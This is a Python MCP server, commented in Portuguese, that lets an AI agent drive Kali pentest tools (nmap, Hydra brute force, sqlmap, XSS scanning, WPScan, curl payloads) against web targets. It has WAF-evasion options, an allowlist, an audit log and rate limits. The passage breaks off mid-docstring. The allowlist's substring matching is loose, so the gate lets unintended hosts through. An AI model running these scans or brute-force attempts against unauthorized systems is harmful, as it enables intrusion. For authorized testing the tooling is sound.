"""
Kali Security Bridge — MCP Server v3

Expõe ferramentas de segurança ofensiva executadas dentro do container
kali-mcp-box via Docker exec. Todos os comandos são passados como lista
de strings: o Docker usa execve() diretamente, sem /bin/sh, tornando
metacaracteres de shell (;, &&, |, $(...)) inofensivos no host.

Funcionalidades v3:
    - 24 ferramentas cobrindo todo o ciclo OWASP de pentest web
    - Persistência SQLite por alvo (~/.kali-mcp/findings.db)
    - Allowlist de alvos autorizados (obrigatória antes de qualquer scan)
    - Audit log de todas as execuções (~/.kali-mcp/audit.log)
    - Rate limiting por ferramenta para evitar sobrecarga acidental
    - Orquestração autônoma via pentest_completo() com 16 fases
    - Geração automática de relatório Markdown ou JSON
    - WPScan + xmlrpc.php para WordPress profundo
    - Verificação de arquivos sensíveis expostos
    - Análise estruturada de headers de segurança e flags de cookies
    - Fuzzing rápido com ffuf (dirs, parâmetros GET/POST, APIs)
    - Requisições HTTP customizadas para verificação de evidências
    - Prova-de-conceito de upload irrestrito de arquivos PHP
    - Enumeração direta de MySQL exposto (databases, usuários, hashes wp_users)

Uso:
    uv run server.py          (stdio — integração local, ex: Claude Code)
    fastmcp dev server.py     (modo desenvolvimento com inspetor web)

    KALI_MCP_TRANSPORT=http uv run server.py
        Sobe em HTTP (streamable) para acesso remoto via Tailscale, ex: de
        um Claude Desktop rodando em outra máquina do tailnet.
        Variáveis:
          KALI_MCP_TRANSPORT=http   (default: stdio)
          KALI_MCP_HOST             (default: 127.0.0.1 — setar para o IP
                                      Tailscale desta máquina para expor só
                                      no tailnet, nunca 0.0.0.0)
          KALI_MCP_PORT             (default: 8765)
"""

from __future__ import annotations

import json
import logging
import os
import re
import shlex
import sqlite3
import time
import uuid
from datetime import datetime
from pathlib import Path
from typing import Any

import docker
from docker.errors import APIError, DockerException, NotFound
from fastmcp import FastMCP
from pydantic import BaseModel

# ── Servidor ──────────────────────────────────────────────────────────────────

# Auth (AWS Cognito) só é exigida no modo HTTP remoto — o uso local via stdio
# (Claude Code nesta máquina) continua sem login, já que ali o próprio SO
# controla quem pode spawnar o processo.
_auth = None
if os.environ.get("KALI_MCP_TRANSPORT", "stdio").lower() == "http":
    from fastmcp.server.auth.providers.aws import AWSCognitoProvider

    _auth = AWSCognitoProvider(
        user_pool_id=os.environ["COGNITO_USER_POOL_ID"],
        aws_region=os.environ.get("COGNITO_REGION", "us-east-1"),
        client_id=os.environ["COGNITO_CLIENT_ID"],
        client_secret=os.environ["COGNITO_CLIENT_SECRET"],
        base_url=os.environ["KALI_MCP_PUBLIC_URL"],
    )

mcp = FastMCP(
    name="kali-security-bridge",
    instructions=(
        "Servidor de automação de testes de segurança completo. "
        "Conecta ao container Kali Linux e executa ferramentas cobrindo todo o ciclo de pentest web: "
        "reconhecimento → enumeração → análise web → exploração → relatório. "
        "OBRIGATÓRIO: adicione o alvo à allowlist antes de qualquer scan. "
        "Use sempre na ordem: verificar_alvo_online → scan_portas_nmap → ferramentas web → exploração → gerar_relatorio."
    ),
    auth=_auth,
)

# ── Configuração ──────────────────────────────────────────────────────────────

CONTAINER_NAME = "kali-mcp-box"
BASE_DIR       = Path.home() / ".kali-mcp"
WORKSPACE_DIR  = BASE_DIR / "workspaces"
DB_PATH        = BASE_DIR / "findings.db"
LOG_PATH       = BASE_DIR / "audit.log"
OUTPUTS_DIR    = Path.home() / "mcps/outputs/kali-mcp"

BASE_DIR.mkdir(parents=True, exist_ok=True)
WORKSPACE_DIR.mkdir(parents=True, exist_ok=True)
OUTPUTS_DIR.mkdir(parents=True, exist_ok=True)

# User-Agent de browser real para evasão de WAF/IDS
_STEALTH_UA = (
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
    "AppleWebKit/537.36 (KHTML, like Gecko) "
    "Chrome/124.0.0.0 Safari/537.36"
)
_STEALTH_HEADERS = [
    "-H", f"User-Agent: {_STEALTH_UA}",
    "-H", "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "-H", "Accept-Language: pt-BR,pt;q=0.9,en;q=0.8",
    "-H", "Accept-Encoding: gzip, deflate",
]

# Intervalo mínimo em segundos entre chamadas ao mesmo tool (rate limiting)
_RATE_LIMITS: dict[str, float] = {
    "ping":      1.0,
    "nmap":      5.0,
    "subfinder": 3.0,
    "gobuster":  3.0,
    "katana":    3.0,
    "nikto":     3.0,
    "testssl":   3.0,
    "nuclei":    5.0,
    "dalfox":    3.0,
    "hydra":    10.0,
    "sqlmap":    5.0,
    "gowitness": 2.0,
    "wpscan":   10.0,
    "curl":      1.0,
    "ffuf":      3.0,
    "mysql":     2.0,
}
_last_call_time: dict[str, float] = {}


# ── Persistência de outputs ───────────────────────────────────────────────────


def _target_output_dir(target: str) -> Path:
    """Retorna (e cria) ~/mcps/outputs/kali-mcp/<host>/ para o alvo."""
    host = target.lower().split("://")[-1].split("/")[0].split(":")[0]
    safe = re.sub(r"[^\w\-.]", "_", host)
    d = OUTPUTS_DIR / safe
    d.mkdir(parents=True, exist_ok=True)
    return d


def _save_scan_output(result: ExecResult) -> None:
    """Persiste output + atualiza session.json. Nunca levanta exceção."""
    try:
        out_dir = _target_output_dir(result.target)
        ts      = datetime.now().strftime("%Y%m%d_%H%M%S")
        fname   = f"{result.tool}_{ts}.txt"
        body    = result.output or ""
        if result.error:
            body += f"\n\n[ERRO] {result.error}"
        (out_dir / fname).write_text(body, encoding="utf-8")

        session_path = out_dir / "session.json"
        session = (
            json.loads(session_path.read_text(encoding="utf-8"))
            if session_path.exists()
            else {"target": out_dir.name, "started": datetime.now().isoformat(), "scans": []}
        )
        session["scans"].append({
            "tool":      result.tool,
            "file":      fname,
            "success":   result.success,
            "exit_code": result.exit_code,
            "timestamp": datetime.now().isoformat(),
        })
        session["last_updated"] = datetime.now().isoformat()
        session_path.write_text(json.dumps(session, indent=2, ensure_ascii=False), encoding="utf-8")
    except Exception:
        pass  # persistência nunca deve interromper o scan

# ── Logging / audit ───────────────────────────────────────────────────────────

logging.basicConfig(
    filename=str(LOG_PATH),
    level=logging.INFO,
    format="%(asctime)s | %(levelname)s | %(message)s",
    datefmt="%Y-%m-%d %H:%M:%S",
)
_audit = logging.getLogger("audit")

# ── Modelos ───────────────────────────────────────────────────────────────────


class ExecResult(BaseModel):
    """Resultado padronizado de qualquer execução no container Kali."""

    tool:      str
    target:    str
    exit_code: int
    success:   bool
    output:    str
    error:     str | None = None


# ── Banco de dados ────────────────────────────────────────────────────────────


def _init_db() -> None:
    with sqlite3.connect(DB_PATH) as conn:
        conn.execute("""
            CREATE TABLE IF NOT EXISTS findings (
                id        INTEGER PRIMARY KEY AUTOINCREMENT,
                tool      TEXT    NOT NULL,
                target    TEXT    NOT NULL,
                timestamp TEXT    NOT NULL,
                exit_code INTEGER NOT NULL,
                success   INTEGER NOT NULL,
                output    TEXT,
                error     TEXT
            )
        """)
        conn.execute("""
            CREATE TABLE IF NOT EXISTS allowlist (
                id    INTEGER PRIMARY KEY AUTOINCREMENT,
                entry TEXT    NOT NULL UNIQUE,
                added TEXT    NOT NULL,
                note  TEXT
            )
        """)
        conn.commit()


_init_db()


def _save_finding(result: ExecResult) -> None:
    with sqlite3.connect(DB_PATH) as conn:
        conn.execute(
            "INSERT INTO findings (tool, target, timestamp, exit_code, success, output, error) "
            "VALUES (?, ?, ?, ?, ?, ?, ?)",
            (
                result.tool,
                result.target,
                datetime.now().isoformat(),
                result.exit_code,
                int(result.success),
                result.output,
                result.error,
            ),
        )
        conn.commit()


# ── Allowlist ─────────────────────────────────────────────────────────────────


def _is_allowed(target: str) -> bool:
    """Verifica se o alvo (IP, hostname ou URL) está na allowlist."""
    with sqlite3.connect(DB_PATH) as conn:
        rows = conn.execute("SELECT entry FROM allowlist").fetchall()

    if not rows:
        return False

    # Normaliza: remove esquema URL e porta para comparar só host/IP
    normalized = target.lower().split("://")[-1].split("/")[0].split(":")[0]
    entries = [r[0].lower() for r in rows]
    return any(
        normalized == e or normalized.endswith(f".{e}") or e in normalized
        for e in entries
    )


# ── Rate limiting ─────────────────────────────────────────────────────────────


def _rate_limit(tool_name: str) -> None:
    now      = time.monotonic()
    interval = _RATE_LIMITS.get(tool_name, 2.0)
    wait     = interval - (now - _last_call_time.get(tool_name, 0.0))
    if wait > 0:
        time.sleep(wait)
    _last_call_time[tool_name] = time.monotonic()


# ── Helpers Docker ────────────────────────────────────────────────────────────


def _get_container() -> docker.models.containers.Container:
    try:
        client = docker.from_env()
    except DockerException as exc:
        raise RuntimeError(
            "Não foi possível conectar ao Docker. "
            "Verifique se o daemon está em execução: sudo systemctl start docker"
        ) from exc

    try:
        container = client.containers.get(CONTAINER_NAME)
    except NotFound:
        raise RuntimeError(
            f"Container '{CONTAINER_NAME}' não encontrado. "
            "Faça o build e suba: cd ~/mcps/kali-mcp && docker compose up -d --build"
        )

    if container.status != "running":
        raise RuntimeError(
            f"Container '{CONTAINER_NAME}' existe mas não está rodando "
            f"(status: {container.status}). Execute: docker compose up -d"
        )

    return container


def _exec_in_kali(
    cmd: list[str],
    tool_name: str,
    target: str,
    skip_allowlist: bool = False,
) -> ExecResult:
    """
    Executa cmd dentro do container Kali via execve (sem shell intermediário).
    Aplica verificação de allowlist, rate limiting e grava o resultado no banco.
    """
    if not cmd or not all(isinstance(a, str) for a in cmd):
        raise ValueError("`cmd` deve ser uma lista de strings não-vazia.")

    if not skip_allowlist and not _is_allowed(target):
        result = ExecResult(
            tool=tool_name, target=target, exit_code=-1, success=False, output="",
            error=(
                f"Alvo '{target}' não está na allowlist. "
                "Use gerenciar_allowlist(action='add', entry='<alvo>') para autorizar."
            ),
        )
        _audit.warning("BLOQUEADO | tool=%s target=%s | fora da allowlist", tool_name, target)
        return result

    _rate_limit(tool_name)

    try:
        container = _get_container()
        exit_code, raw = container.exec_run(
            cmd,
            demux=False,
            stdout=True,
            stderr=True,
        )
        output = raw.decode("utf-8", errors="replace").strip() if raw else ""
        result = ExecResult(
            tool=tool_name, target=target,
            exit_code=exit_code, success=(exit_code == 0), output=output,
        )

    except RuntimeError as exc:
        result = ExecResult(
            tool=tool_name, target=target,
            exit_code=-1, success=False, output="", error=str(exc),
        )
    except APIError as exc:
        result = ExecResult(
            tool=tool_name, target=target,
            exit_code=-1, success=False, output="",
            error=f"Docker API error: {exc.explanation}",
        )

    _audit.info(
        "tool=%s target=%s exit_code=%d success=%s",
        tool_name, target, result.exit_code, result.success,
    )
    _save_finding(result)
    _save_scan_output(result)
    return result


# ── Ferramentas MCP ───────────────────────────────────────────────────────────


@mcp.tool()
def gerenciar_allowlist(
    action: str,
    entry: str = "",
    note: str = "",
) -> dict[str, Any]:
    """
    Gerencia a allowlist de alvos autorizados para testes.

    NENHUMA ferramenta de scan funcionará sem que o alvo esteja aqui.
    Configure sempre antes de iniciar um pentest.

    Args:
        action: "add" | "remove" | "list"
        entry:  IP, hostname ou domínio. Ex: "192.168.1.10", "app.local", "exemplo.com"
        note:   Contexto de autorização. Ex: "servidor de homologação — autorizado por João em 2025-05-18"

    Returns:
        Resultado da operação e lista atualizada de entradas.
    """
    if action == "add":
        if not entry:
            return {"success": False, "error": "entry é obrigatório para action='add'"}
        with sqlite3.connect(DB_PATH) as conn:
            conn.execute(
                "INSERT OR IGNORE INTO allowlist (entry, added, note) VALUES (?, ?, ?)",
                (entry.lower(), datetime.now().isoformat(), note),
            )
            conn.commit()
        _audit.info("ALLOWLIST ADD | entry=%s note=%s", entry, note)
        return {"success": True, "action": "add", "entry": entry}

    if action == "remove":
        if not entry:
            return {"success": False, "error": "entry é obrigatório para action='remove'"}
        with sqlite3.connect(DB_PATH) as conn:
            conn.execute("DELETE FROM allowlist WHERE entry = ?", (entry.lower(),))
            conn.commit()
        _audit.info("ALLOWLIST REMOVE | entry=%s", entry)
        return {"success": True, "action": "remove", "entry": entry}

    if action == "list":
        with sqlite3.connect(DB_PATH) as conn:
            rows = conn.execute(
                "SELECT entry, added, note FROM allowlist ORDER BY added"
            ).fetchall()
        return {
            "success": True,
            "allowlist": [{"entry": r[0], "added": r[1], "note": r[2]} for r in rows],
            "total": len(rows),
        }

    return {"success": False, "error": f"action inválida: '{action}'. Use 'add', 'remove' ou 'list'"}


@mcp.tool()
def verificar_alvo_online(target: str) -> dict[str, Any]:
    """
    Verifica se o alvo responde via ping antes de iniciar qualquer scan.
    Use como primeira verificação para evitar scans desnecessários.

    Args:
        target: IP ou hostname. Ex: "192.168.1.10", "app.exemplo.com"
    """
    cmd = ["ping", "-c", "3", "-W", "2", target]
    return _exec_in_kali(cmd, tool_name="ping", target=target).model_dump()


@mcp.tool()
def scan_portas_nmap(
    target: str,
    flags: str = "-sV -F",
    stealth: bool = False,
) -> dict[str, Any]:
    """
    Realiza varredura de portas usando Nmap. Use SEMPRE como primeira fase.

    Flags comuns:
      "-sV -F"          → fast scan com detecção de versão — padrão
      "-sV -O"          → versões + detecção de SO
      "-p 1-65535 -sV"  → todas as portas
      "-p 80,443,8080"  → portas específicas
      "-A"              → agressivo (versão, SO, scripts NSE, traceroute)
      "--script vuln"   → scripts NSE de vulnerabilidades

    Args:
        target:  IP, hostname ou CIDR. Ex: "192.168.1.1", "10.0.0.0/24"
        flags:   Flags do Nmap (convertidas via shlex, sem interpretação de shell).
        stealth: True = timing T2 + scan-delay 1s para evitar IDS/rate-limit.
    """
    nmap_flags = shlex.split(flags)
    if stealth and "--scan-delay" not in flags:
        nmap_flags += ["--scan-delay", "1s", "-T2"]
    cmd = ["nmap"] + nmap_flags + [target]
    return _exec_in_kali(cmd, tool_name="nmap", target=target).model_dump()


@mcp.tool()
def enum_subdominios_subfinder(domain: str) -> dict[str, Any]:
    """
    Enumera subdomínios via reconhecimento passivo usando Subfinder.
    Use quando o alvo for um domínio público, após o Nmap inicial.

    Args:
        domain: Domínio raiz. Ex: "exemplo.com.br", "app.local"
    """
    cmd = ["subfinder", "-d", domain, "-silent"]
    return _exec_in_kali(cmd, tool_name="subfinder", target=domain).model_dump()


@mcp.tool()
def scan_diretorios_gobuster(
    target_url: str,
    wordlist: str = "/usr/share/wordlists/dirb/common.txt",
    extensions: str = "php,html,js,txt,bak,zip,env",
    evasion: bool = False,
) -> dict[str, Any]:
    """
    Enumera diretórios e arquivos ocultos usando Gobuster.
    Use após identificar portas HTTP/HTTPS no Nmap, antes do Nikto.

    Wordlists disponíveis no container:
      /usr/share/wordlists/dirb/common.txt                           → rápido
      /usr/share/wordlists/dirb/big.txt                              → médio
      /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt   → completo

    Args:
        target_url: URL base. Ex: "http://192.168.1.10", "https://app.local:8443"
        wordlist:   Caminho da wordlist dentro do container.
        extensions: Extensões a testar, separadas por vírgula.
        evasion:    True = 5 threads + delay 300ms + User-Agent de browser real.
                    Use quando o alvo tiver WAF ou rate limiting.
    """
    cmd = [
        "gobuster", "dir",
        "-u", target_url,
        "-w", wordlist,
        "-x", extensions,
        "-q", "--no-error", "--timeout", "15s",
    ]
    if evasion:
        cmd += ["-t", "5", "--delay", "300ms", "-a", _STEALTH_UA]
    else:
        cmd += ["-t", "20"]
    return _exec_in_kali(cmd, tool_name="gobuster", target=target_url).model_dump()


@mcp.tool()
def crawl_aplicacao_katana(
    target_url: str,
    depth: int = 3,
    evasion: bool = False,
) -> dict[str, Any]:
    """
    Faz crawling da aplicação web para descobrir endpoints e parâmetros usando Katana.
    Use após o Gobuster. URLs com parâmetros na saída são candidatas a Dalfox e SQLMap.

    Args:
        target_url: URL base. Ex: "http://192.168.1.10"
        depth:      Profundidade do crawl (1-5). Padrão: 3
        evasion:    True = rate-limit 5 req/s + headers de browser real.
    """
    if not 1 <= depth <= 5:
        raise ValueError("depth deve ser entre 1 e 5")
    cmd = [
        "katana",
        "-u", target_url,
        "-d", str(depth),
        "-silent",
        "-jc",
        "-xhr",
        "-kf", "all",
        "-timeout", "30",
        "-retry", "2",
    ]
    if evasion:
        cmd += ["-rate-limit", "5", "-H", f"User-Agent: {_STEALTH_UA}"]
    return _exec_in_kali(cmd, tool_name="katana", target=target_url).model_dump()


@mcp.tool()
def scan_vulnerabilidades_nikto(
    target_url: str,
    evasion: bool = False,
) -> dict[str, Any]:
    """
    Executa varredura de vulnerabilidades web usando Nikto.
    Use quando o Nmap identificar portas HTTP/HTTPS abertas.

    Detecta: arquivos sensíveis expostos, cabeçalhos ausentes, métodos HTTP
    perigosos, versões desatualizadas, vetores XSS/injeção, SSL/TLS fraco.

    Args:
        target_url: URL completa. Ex: "http://192.168.1.10", "https://app.local:8443"
        evasion:    True = User-Agent de browser + pause 2s entre testes.
    """
    cmd = [
        "nikto",
        "-h", target_url,
        "-nointeractive",
        "-maxtime", "180s",
    ]
    if evasion:
        cmd += ["-useragent", _STEALTH_UA, "-pause", "2"]
    return _exec_in_kali(cmd, tool_name="nikto", target=target_url).model_dump()


@mcp.tool()
def scan_ssl_testssl(target: str, port: int = 443) -> dict[str, Any]:
    """
    Analisa configuração SSL/TLS usando testssl.sh.
    Use quando Nmap identificar porta 443 ou outro serviço HTTPS.

    Detecta: protocolos fracos (SSLv2/v3, TLS 1.0/1.1), cifras fracas,
    BEAST/POODLE/HEARTBLEED, certificados inválidos/expirados, HSTS ausente.

    Args:
        target: IP ou hostname. Ex: "192.168.1.10", "app.exemplo.com"
        port:   Porta HTTPS. Padrão: 443
    """
    cmd = [
        "testssl.sh",
        "--quiet",
        "--color", "0",
        "--fast",
        f"{target}:{port}",
    ]
    return _exec_in_kali(cmd, tool_name="testssl", target=target).model_dump()


@mcp.tool()
def scan_nuclei(
    target_url: str,
    severity: str = "medium,high,critical",
    tags: str = "",
) -> dict[str, Any]:
    """
    Detecta CVEs e vulnerabilidades conhecidas via templates usando Nuclei.
    Use após o Nikto para cobrir CVEs específicos baseados nas versões identificadas.

    Args:
        target_url: URL do alvo. Ex: "http://192.168.1.10"
        severity:   Filtro de severidade. Ex: "high,critical" | "medium,high,critical"
        tags:       Tags de templates para filtrar. Ex: "wordpress", "apache", "xss,sqli"
                    Deixe vazio para usar todos os templates da severidade especificada.
    """
    cmd = [
        "nuclei",
        "-u", target_url,
        "-severity", severity,
        "-silent",
        "-no-color",
        "-timeout", "10",
        "-rate-limit", "20",
        "-H", f"User-Agent: {_STEALTH_UA}",
    ]
    if tags:
        cmd += ["-tags", tags]
    return _exec_in_kali(cmd, tool_name="nuclei", target=target_url).model_dump()


@mcp.tool()
def scan_xss_dalfox(target_url: str) -> dict[str, Any]:
    """
    Testa Cross-Site Scripting (XSS) usando Dalfox.
    Use quando a URL contiver parâmetros GET ou o Katana descobrir formulários.

    Detecta: Reflected XSS, DOM XSS, bypass de filtros WAF.

    Args:
        target_url: URL com parâmetros. Ex: "http://app.local/search?q=test"
    """
    cmd = [
        "dalfox",
        "url", target_url,
        "--no-color",
        "--silence",
        "--timeout", "30",
        "--worker", "10",
    ]
    return _exec_in_kali(cmd, tool_name="dalfox", target=target_url).model_dump()


@mcp.tool()
def brute_force_hydra(
    target: str,
    service: str,
    port: int,
    userlist: str = "/usr/share/wordlists/unix_users.txt",
    passlist: str = "/usr/share/wordlists/rockyou.txt",
    http_form_path: str = "/wp-login.php",
    http_form_data: str = "log=^USER^&pwd=^PASS^&wp-submit=Log+In",
    http_form_fail: str = "ERROR",
) -> dict[str, Any]:
    """
    Testa credenciais fracas em serviços de autenticação usando Hydra.
    Use quando Nmap identificar SSH, FTP, HTTP-Auth, RDP ou Telnet.

    ATENÇÃO: pode bloquear contas ou gerar alertas. Use só em ambientes autorizados.

    Serviços válidos: ssh, ftp, http-get, http-post-form, rdp, telnet, smtp, pop3, imap, smb

    Para http-post-form, configure:
      http_form_path: caminho do formulário. Ex: "/wp-login.php", "/login"
      http_form_data: campos do formulário com ^USER^ e ^PASS^.
                      Ex: "log=^USER^&pwd=^PASS^&wp-submit=Log+In"
      http_form_fail: string presente na resposta em caso de falha.
                      Ex: "ERROR", "Invalid", "incorrect"

    Args:
        target:         IP ou hostname do alvo.
        service:        Serviço a testar. Ex: "ssh", "ftp", "http-post-form"
        port:           Porta do serviço.
        userlist:       Wordlist de usuários no container.
        passlist:       Wordlist de senhas no container.
        http_form_path: Caminho do formulário (só http-post-form).
        http_form_data: Campos POST com ^USER^ e ^PASS^ (só http-post-form).
        http_form_fail: String de falha na resposta (só http-post-form).
    """
    _ALLOWED_SERVICES = {"ssh", "ftp", "http-get", "http-post-form", "rdp", "telnet", "smtp", "pop3", "imap", "smb"}
    if service not in _ALLOWED_SERVICES:
        raise ValueError(f"Serviço '{service}' inválido. Válidos: {sorted(_ALLOWED_SERVICES)}")

    base_cmd = [
        "hydra",
        "-L", userlist,
        "-P", passlist,
        "-s", str(port),
        "-t", "4",
        "-f",
        "-q",
        target,
    ]

    if service == "http-post-form":
        form_param = f"{http_form_path}:{http_form_data}:{http_form_fail}"
        cmd = base_cmd + ["http-post-form", form_param]
    else:
        cmd = base_cmd + [service]

    return _exec_in_kali(cmd, tool_name="hydra", target=target).model_dump()


@mcp.tool()
def scan_sql_injection_sqlmap(
    target_url: str,
    risk: int = 1,
    level: int = 1,
) -> dict[str, Any]:
    """
    Testa SQL Injection usando SQLMap.
    Use quando a URL contiver parâmetros GET/POST ou o Nikto reportar possível SQLi.

    Escalonamento obrigatório — sempre comece no nível mais baixo:
      Conservador: risk=1, level=1
      Moderado:    risk=2, level=3
      Máximo:      risk=3, level=5  ← pode modificar dados, use só com autorização explícita

    Args:
        target_url: URL com parâmetros. Ex: "http://app.local/user?id=1"
        risk:       Nível de risco dos payloads (1-3). Padrão: 1
        level:      Profundidade dos testes (1-5). Padrão: 1
    """
    if not 1 <= risk <= 3:
        raise ValueError(f"risk deve ser entre 1 e 3. Recebido: {risk}")
    if not 1 <= level <= 5:
        raise ValueError(f"level deve ser entre 1 e 5. Recebido: {level}")

    cmd = [
        "sqlmap",
        "-u", target_url,
        "--batch",
        "--random-agent",
        f"--risk={risk}",
        f"--level={level}",
        "--output-dir=/tmp/sqlmap-results",
    ]
    return _exec_in_kali(cmd, tool_name="sqlmap", target=target_url).model_dump()


@mcp.tool()
def screenshot_gowitness(target_url: str) -> dict[str, Any]:
    """
    Captura screenshot da aplicação web para documentar evidências usando Gowitness.
    Screenshots salvos em /tmp/gowitness/ dentro do container.

    Args:
        target_url: URL a capturar. Ex: "http://192.168.1.10/admin"
    """
    cmd = [
        "gowitness",
        "scan", "single",
        "--url", target_url,
        "--screenshot-path", "/tmp/gowitness/",
        "--write-none",
    ]
    return _exec_in_kali(cmd, tool_name="gowitness", target=target_url).model_dump()


@mcp.tool()
def verificar_arquivos_expostos(
    target_url: str,
    evasion: bool = False,
) -> dict[str, Any]:
    """
    Verifica exposição de arquivos e diretórios sensíveis usando Gobuster com wordlist dedicada.

    Detecta: .env, wp-config.php.bak, phpinfo.php, backup.zip, .git/, debug.log,
    composer.json, secrets.yml, database.sql, e dezenas de outros arquivos críticos.
    Use logo após o Gobuster padrão para cobertura específica de leaks.

    Args:
        target_url: URL base do alvo. Ex: "http://192.168.1.10", "http://vulnwp-app:8080"
        evasion:    True = 3 threads + delay 500ms + User-Agent real. Use em sites com WAF.
    """
    cmd = [
        "gobuster", "dir",
        "-u", target_url,
        "-w", "/usr/share/wordlists/sensitive-paths.txt",
        "-q", "--no-error", "--timeout", "15s",
    ]
    if evasion:
        cmd += ["-t", "3", "--delay", "500ms", "-a", _STEALTH_UA]
    else:
        cmd += ["-t", "10"]
    return _exec_in_kali(cmd, tool_name="gobuster", target=target_url).model_dump()


@mcp.tool()
def scan_wordpress_wpscan(
    target_url: str,
    enumerate: str = "vp,vt,u",
    aggressive: bool = False,
) -> dict[str, Any]:
    """
    Executa auditoria completa de WordPress usando WPScan.
    Use quando identificar um site WordPress (wp-login.php, wp-content/ no Gobuster/Nikto).

    Detecta: plugins e temas vulneráveis, usuários enumerados, senhas fracas,
    xmlrpc habilitado, configurações inseguras, backups expostos.

    Args:
        target_url:  URL do WordPress. Ex: "http://192.168.1.10", "http://vulnwp-app:8080"
        enumerate:   O que enumerar. Padrão: "vp,vt,u" (plugins vulneráveis, temas, usuários).
                     Opções: "vp" plugins vuln, "ap" todos plugins, "vt" temas vuln,
                             "at" todos temas, "u" usuários, "cb" config backups, "dbe" DB exports
        aggressive:  True = modo agressivo (mais detalhado, mais lento e ruidoso).
    """
    cmd = [
        "wpscan",
        "--url", target_url,
        "--no-banner",
        "--no-update",
        "--disable-tls-checks",
        "--format", "cli-no-colour",
        "--enumerate", enumerate,
    ]
    if aggressive:
        cmd += ["--plugins-detection", "aggressive", "--themes-detection", "aggressive"]
    else:
        cmd += ["--plugins-detection", "passive"]

    return _exec_in_kali(cmd, tool_name="wpscan", target=target_url).model_dump()


@mcp.tool()
def fazer_requisicao_http(
    url: str,
    method: str = "GET",
    headers: str = "",
    body: str = "",
    follow_redirects: bool = True,
    timeout: int = 15,
) -> dict[str, Any]:
    """
    Faz requisição HTTP customizada para verificar conteúdo, headers ou testar payloads.
    Use para confirmar arquivos expostos (.env, phpinfo.php, backups), inspecionar responses
    de endpoints ou enviar payloads manuais durante verificação de evidências.

    Args:
        url:               URL completa. Ex: "http://192.168.1.10/.env"
        method:            Método HTTP. Padrão: "GET". Outros: "POST", "HEAD", "PUT"
        headers:           Headers extras, um por linha.
                           Ex: "Authorization: Bearer token\\nX-Custom: value"
        body:              Corpo da requisição (para POST/PUT). Ex: "user=admin&pass=test"
        follow_redirects:  Seguir redirects. Padrão: True
        timeout:           Timeout em segundos. Padrão: 15
    """
    cmd = [
        "curl", "-s", "-i",
        "-X", method.upper(),
        "--max-time", str(timeout),
    ]
    if follow_redirects:
        cmd += ["-L"]
    for h in headers.splitlines():
        h = h.strip()
        if h:
            cmd += ["-H", h]
    if body:
        cmd += ["-d", body]
    cmd.append(url)
    return _exec_in_kali(cmd, tool_name="curl", target=url).model_dump()


@mcp.tool()
def verificar_headers_seguranca(target_url: str) -> dict[str, Any]:
    """
    Analisa headers de segurança HTTP e flags de cookies do alvo.
    Retorna análise estruturada: headers presentes, ausentes ou misconfigurados,
    com severidade (high/medium/low) para cada achado.

    Verifica: Content-Security-Policy, X-Frame-Options, X-Content-Type-Options,
    Strict-Transport-Security, Referrer-Policy, Permissions-Policy,
    CORS (Access-Control-Allow-Origin), cookies (HttpOnly, Secure, SameSite).

    Args:
        target_url: URL do alvo. Ex: "http://192.168.1.10", "https://app.local"
    """
    cmd = ["curl", "-s", "-I", "-L", "--max-time", "10", target_url]
    result = _exec_in_kali(cmd, tool_name="curl", target=target_url)

    headers: dict[str, str] = {}
    for line in result.output.splitlines():
        if ":" in line and not line.lower().startswith("http/"):
            key, _, val = line.partition(":")
            headers[key.strip().lower()] = val.strip()

    _SECURITY_HEADERS: dict[str, str] = {
        "content-security-policy":   "high",
        "x-frame-options":           "medium",
        "x-content-type-options":    "medium",
        "strict-transport-security": "high",
        "referrer-policy":           "low",
        "permissions-policy":        "low",
    }

    findings = []
    for header, severity in _SECURITY_HEADERS.items():
        value = headers.get(header)
        findings.append({
            "header":   header,
            "status":   "present" if value else "missing",
            "value":    value,
            "severity": "info" if value else severity,
            "detail":   "OK" if value else f"{header} não configurado",
        })

    cors = headers.get("access-control-allow-origin")
    if cors == "*":
        findings.append({
            "header": "access-control-allow-origin", "status": "misconfigured",
            "value": cors, "severity": "high",
            "detail": "CORS wildcard — qualquer origem pode fazer requests autenticados",
        })
    elif cors:
        findings.append({
            "header": "access-control-allow-origin", "status": "present",
            "value": cors, "severity": "info",
            "detail": "CORS com origem específica",
        })

    cookie_issues = []
    for line in result.output.splitlines():
        if line.lower().startswith("set-cookie:"):
            cookie_val = line[11:].strip()
            low = cookie_val.lower()
            issues = []
            if "httponly" not in low:
                issues.append("HttpOnly ausente — acessível via JS (risco XSS)")
            if "secure" not in low:
                issues.append("Secure ausente — enviado em HTTP não criptografado")
            if "samesite" not in low:
                issues.append("SameSite ausente — vulnerável a CSRF")
            if issues:
                cookie_issues.append({"cookie": cookie_val[:100], "issues": issues})

    high   = sum(1 for f in findings if f["severity"] == "high")
    medium = sum(1 for f in findings if f["severity"] == "medium")

    return {
        "tool":             "curl-headers",
        "target":           target_url,
        "exit_code":        result.exit_code,
        "success":          result.success,
        "raw_headers":      result.output,
        "security_headers": findings,
        "cookie_issues":    cookie_issues,
        "summary": {
            "high":         high,
            "medium":       medium,
            "total_issues": high + medium + len(cookie_issues),
        },
    }


@mcp.tool()
def scan_fuzzing_ffuf(
    target_url: str,
    wordlist: str = "/usr/share/wordlists/dirb/common.txt",
    param_name: str = "",
    method: str = "GET",
    match_codes: str = "200,301,302,403",
    filter_size: str = "",
    evasion: bool = False,
) -> dict[str, Any]:
    """
    Fuzzing rápido usando ffuf. Mais veloz e flexível que gobuster.
    Suporta fuzzing de diretórios, parâmetros GET/POST e endpoints de API REST.

    Modos:
      Diretórios:  target_url="http://app/FUZZ"  (coloque FUZZ diretamente na URL)
      Parâmetros:  target_url="http://app/page" + param_name="id"  → gera ?id=FUZZ
      POST body:   method="POST" + param_name="username"

    Wordlists disponíveis:
      /usr/share/wordlists/dirb/common.txt                          → geral rápido
      /usr/share/wordlists/dirb/big.txt                             → amplo
      /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt  → completo
      /usr/share/wordlists/sensitive-paths.txt                      → arquivos sensíveis

    Args:
        target_url:   URL com FUZZ embutido, ou URL base quando param_name for fornecido.
        wordlist:     Caminho da wordlist no container.
        param_name:   Parâmetro a fuzzar. Gera ?param=FUZZ (GET) ou body param=FUZZ (POST).
        method:       Método HTTP. Padrão: "GET"
        match_codes:  Status codes a reportar. Padrão: "200,301,302,403"
        filter_size:  Filtrar respostas com este tamanho exato (bytes).
                      Use para esconder a resposta padrão de 404 personalizado.
